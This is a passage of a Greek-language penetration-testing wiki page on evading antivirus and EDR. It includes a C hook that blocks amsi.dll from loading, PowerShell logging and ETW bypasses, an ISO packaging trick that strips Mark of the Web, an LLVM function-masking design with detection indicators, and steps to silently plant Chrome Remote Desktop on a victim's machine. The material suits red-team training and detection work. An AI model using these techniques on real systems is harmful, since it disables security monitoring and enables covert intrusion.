#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (σε οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με την αποστολή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, αποφεύγοντας την ανίχνευση από signatures μέσω τυχαιοποιημένων συναρτήσεων που ορίζονται από τον χρήστη, μεταβλητών και εκφράσεων χαρακτήρων, ενώ εφαρμόζει τυχαία χρήση κεφαλαίων και πεζών στα keywords του PowerShell για να αποφεύγεται η ανίχνευση από signatures.

**Αφαίρεση του signature που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το signature του AMSI που εντοπίστηκε από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για το signature του AMSI και στη συνέχεια το αντικαθιστά με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PowerShell

Η καταγραφή PowerShell είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποιήστε το PowerShell Transcription και το Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρησιμοποιήστε την έκδοση 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρησιμοποιήστε μια unmanaged συνεδρία PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (την προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Με αυτόν τον τρόπο παρακάμπτονται τα controls που αφορούν συγκεκριμένα τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιούνται από μόνα τους το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Πολλές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί και ίσως να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Απο-obfuscation .NET Binaries που προστατεύονται με ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να αντιμετωπίζετε πολλά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα σχεδόν αρχικό IL**, το οποίο μπορεί στη συνέχεια να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση του Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλεί crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), που μπορούν να φανούν χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (fork του de4dot με υποστήριξη ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Σημαίες:
     • `-p crx` – επιλέγει το profile ConfuserEx 2
     • Το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy calls – Το ConfuserEx αντικαθιστά τις απευθείας κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω την αποσυμπίληση. Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το binary που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά, το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μονογραμμική εντολή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), το οποίο προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, που δημιουργούνται από το framework template metaprogramming της C++, ώστε να δυσκολέψει κάπως τη ζωή όσων θέλουν να κάνουν crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας obfuscator δυαδικών αρχείων x64, ο οποίος μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα αρχεία.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, το οποίο χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly, μετατρέποντας τις κανονικές εντολές σε αλυσίδες ROP και ανατρέποντας τη φυσική μας αντίληψη για την κανονική ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και κατόπιν να τα φορτώσει

### Αυτο-απόκρυψη ανά συνάρτηση με υποβοήθηση του LLVM compiler

Αντί να γίνεται masking σε ένα ολόκληρο implant μόνο όταν βρίσκεται σε αδράνεια, ένα τροποποιημένο backend LLVM X86 μπορεί να διατηρεί επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει αποσυμβολισμένα ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό κώδικα μηχανής και εκπέμπει έναν κοινό handler masking στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσεων Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή και τη βελτιστοποίηση εντολών, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε εκπεμπόμενη εντολή return** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει την τελευταία `MachineInstr::isReturn()`, τη διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο προσαρτημένο epilogue και αντικαθιστά τα προηγούμενα return με `JMP_1 handler`. Διατηρήστε οποιοδήποτε compiler-generated teardown της στοίβας/frame προηγείται κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stub ανά συνάρτηση, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που είναι κοινά μεταξύ των σταδίων εκπομπής επιτρέπουν σε ένα branch του prologue να στοχεύει το epilogue που θα εκπεμφθεί αργότερα· για χειροκίνητη εκπομπή ενός near `je`, γράψτε `0F 84` ακολουθούμενο από την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα jump προς τον handler μπορούν αντί γι’ αυτό να εκπεμφθούν ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, αν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte, οι οποίες περιέχουν έναν function pointer που έχει προσαρμοστεί από τον loader μαζί με ένα μήκος runtime, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στο offset εγγραφής `+8`, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE section έχουν μήκος μόνο οκτώ byte, επομένως η αναζήτηση runtime βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό RVA του entry point στο stub και ανακατευθύνει το `AddressOfEntryPoint`· το PIC stub λαμβάνει το image base από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα PE32+ imports για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το prologue, που παραμένει μόνιμα αναγνώσιμο, καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που είναι ακόμη clear. Στη συνέχεια, το epilogue χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` byte), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata. Το stub καθαρίζει το sentinel και κάνει jump στο `ImageBase + original_entry_point_RVA` αφού γίνουν masking όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στο προσαρτημένο epilogue, ενώ κάθε προηγούμενο return κάνει jump κατευθείαν στον κοινό handler. Το κανονικό epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε μετά το re-masking το `ret` του handler να καταναλώσει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρήσει το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και δείκτες ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (`0x46` byte σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte προς byte με το χαμηλό byte του κλειδιού και στη συνέχεια το ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά την έξοδο κάθε κανονικής κλήσης.<sup>[[38]](#references)[[39]](#references)</sup>

Οι δείκτες υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και section `.funcmet` που περιέχει ένα κλειδί μαζί με relocated pointers προς το `.text`·
- parsing του PEB, του import table και του section table πριν από το CRT, ακολουθούμενο από κλήσεις μέσω κάθε pointer metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά return sites που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες μεταβάσεις `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Αυτό είναι αποφυγή memory scanner, όχι κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό clear σώμα και ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` κάνουν επίσης την offline ανάκτηση εύκολη.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Οι θέσεις TEB του PoC είναι τοπικές για κάθε thread, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές σε όλη τη διεργασία. Επομένως, η ταυτόχρονη ή αναδρομική είσοδος μπορεί να αλλάξει ξανά τις εντολές ενώ εκτελείται άλλη κλήση· εξαιρέσεις και μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις μεταβάσεις, να επαναφέρει την προστασία που επιστρέφεται πραγματικά μέσω του `lpflOldProtect`, να αποφεύγει τα hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` ως προς τη στοίχιση της στοίβας x64 και να καλεί το `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων byte. Η Microsoft ορίζει ρητά ότι ο caller είναι υπεύθυνος για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen και MoTW

Ίσως να έχετε δει αυτήν την οθόνη κατά τη λήψη και εκτέλεση ορισμένων εκτελέσιμων αρχείων από το διαδίκτυο.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη. Αυτό σημαίνει ότι εφαρμογές που δεν λαμβάνονται συχνά ενεργοποιούν το SmartScreen, το οποίο ειδοποιεί τον τελικό χρήστη και εμποδίζει την εκτέλεση του αρχείου (αν και το αρχείο μπορεί και πάλι να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που λήφθηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που είναι υπογεγραμμένα με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε την προσθήκη Mark of The Web στα payloads σας είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου, ώστε να παρακάμπτεται το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO μέσω του [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει σε εφαρμογές και στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως, χωρίς να καταγράφει συμβάντα. Αυτό γίνεται με την επιδιόρθωση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και παραμένει ένας πολύ καλός τρόπος για την εκτέλεση των post-exploitation εργαλείων σας χωρίς να εντοπιστείτε από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να μας απασχολήσει μόνο η επιδιόρθωση του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Περιλαμβάνει **την εκκίνηση μιας νέας αναλώσιμης διεργασίας**, την εισαγωγή του κακόβουλου post-exploitation κώδικά σας στη νέα διεργασία, την εκτέλεσή του και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι αν κάτι πάει στραβά κατά τη διάρκεια της post-exploitation ενέργειάς μας ή αν εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας**. Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την εισαγωγή του κακόβουλου post-exploitation κώδικα **στην ίδια τη διεργασία του**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον διερμηνευτή που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει ότι το Defender εξακολουθεί να σαρώνει τα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες είχαν επιτυχία.

## TokenStomping

Το Token stomping χειρίζεται το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των προνομίων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, εμποδίζοντάς την όμως να εκτελέσει προνομιακές ενέργειες επιθεώρησης ή αποκατάστασης.

Για να αποτραπεί αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** από το να αποκτούν handles στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και στη συνέχεια να το χρησιμοποιήσετε για να αποκτήσετε τον έλεγχό του και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και, στη συνέχεια, κάντε κλικ στο αρχείο MSI για Windows, ώστε να το κατεβάσετε.
2. Εκτελέστε σιωπηλά το installer στο μηχάνημα του θύματος (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο wizard θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένες τεχνικές evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Το evasion είναι ένα πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο Advanced Evasion τεχνικών.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και σας το απομονώνει.\
